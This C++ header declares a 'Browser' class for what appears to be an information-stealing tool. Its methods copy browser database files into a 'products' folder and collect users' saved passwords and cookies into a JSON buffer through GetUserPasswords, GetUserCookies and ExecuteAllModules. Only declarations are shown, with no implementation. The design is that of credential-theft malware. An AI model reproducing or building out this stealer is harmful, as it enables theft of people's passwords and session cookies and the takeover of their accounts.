#pragma once
#include "Utils.hpp"
#include "sqlite3.h"
#include <iostream>
#include "Configuration.h"

namespace Tool
{
	namespace Browsers
	{
		class Browser {
		public:
			Browser(Tool::Configuration::config_t MainContext_t);
			Tool::Configuration::config_t MainContext_t;
			bool bIsBrowserInstalled = false;
			int iPasswordId = 0;
			std::string sPasswordsBuffer;
			std::string sCookiesBuffer;
			std::string sBrowserIdentifier;
			std::string sBrowserRootPath;
			void CreateBrowserProductDir();
			void CopyBrowserFileToProducts(std::string sDbFilePath, std::string& sCopiedDbPath);
			static void Execute(Tool::Browsers::Browser& bBrowser, Tool::Configuration::config_t& MainContext_t, awesomejson::json& jFinalBuffer);
			virtual void ExecuteAllModules(awesomejson::json& jFinalResults, Tool::Browsers::Browser& Browser);
			virtual void GetUserCookies(awesomejson::json& jCookies);
			virtual void GetUserPasswords(awesomejson::json& jPasswords);
		};
	}
}